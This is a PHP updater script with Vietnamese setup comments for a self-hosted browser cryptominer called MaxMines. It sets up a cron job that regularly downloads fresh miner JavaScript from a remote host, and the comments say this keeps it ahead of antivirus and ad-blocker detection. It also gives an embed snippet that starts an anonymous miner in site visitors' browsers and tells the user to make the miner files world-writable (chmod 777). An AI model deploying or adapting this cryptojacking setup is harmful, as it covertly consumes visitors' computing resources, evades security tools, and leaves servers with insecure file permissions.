<?php
/* MaxMines Self-Hosted Library */

/*********************************
Hướng dẫn:
1) Giải nén nội dung thư mục của project này vào thư mục root trang web của bạn
2) Đảm bảo bạn đã có php-curl trên máy chủ của bạn, nếu nó không tồn tại thì 
 dùng lệnh cài nó (centos: yum install php-curl, debian: apt-get install php-curl)
3) Thay đổi permission của hai tệp thành 777 để chúng có thể được ghi đè lên khi 
 cập nhật: chmod 777 lib/maxmines.min.js  lib/version.txt
4) Cài đặt cron để kiểm tra cập nhật cứ sau 12 giờ:
Trên máy chủ của bạn, nhập crontab -e và đặt dòng này ở dưới cùng: */
// Đặt sau đây trong tập tin crontab của bạn:  0 */12 * * * php /var/www/html/website/updater.php >> /var/www/html/website/mm_log.txt
/*
 Nó sẽ kiểm tra cập nhật script mới nhất trên các máy chủ MaxMines và tải về
 script mới nhất. Bất cứ khi nào các script cũ đang được phát hiện bởi A/V hoặc 
 Adblocker, sẽ có một script mới tự động được tải xuống máy chủ của bạn.

5) Chạy 'php updater.php' để kiểm tra bất kỳ lỗi nào trong việc cập nhật và cập nhật bất kỳ script lỗi thời nào trong bước tiếp theo
6) Thêm script vào trang web của bạn:
<script src="lib/maxmines.min.js"></script>
<script>
            var miner=new MaxMines.Anonymous('YOUR_PUBLIC_KEY', {
                threads:4,autoThreads:false,throttle:0.2,
            });
        miner.start();
</script>
7) Xong! (Hãy chắc chắn rằng bạn đã thay đổi YOU_PUBLIC_KEY bằng public key của bạn được lấy từ bảng điều khiển https://maxmines.com).
*********************************/

$updateTime = time();
$updater = "https://github.com/thanhtrungzz/maxmines-version/checkupdate";
$versionFile = "lib/mm_version.txt";
$myfile = fopen($versionFile, "r") or die("Unable to open file!");
$version = (int)fread($myfile,filesize($versionFile));
fclose($myfile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $updater);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$serverVersion = (int)curl_exec($ch);
curl_close($ch);

if($serverVersion>$version){ // Update
  $script1 = file_get_contents("https://maxmines.com/lib/maxmines.min.js");
  try {
    file_put_contents("lib/maxmines.min.js", $script1);
    $editVersion=fopen($versionFile, "w");
    fwrite($editVersion, $serverVersion);
    fclose($editVersion);
    echo "{$updateTime} - Updated from version: {$version} to {$serverVersion}\r\n";
  } catch (Exception $e) {
    echo $updateTime . ' - Error: ',  $e->getMessage(), "\r\n";
  }
} else{
  printf("{$updateTime} - Version is already up-to-date.\r\n");
}


?>
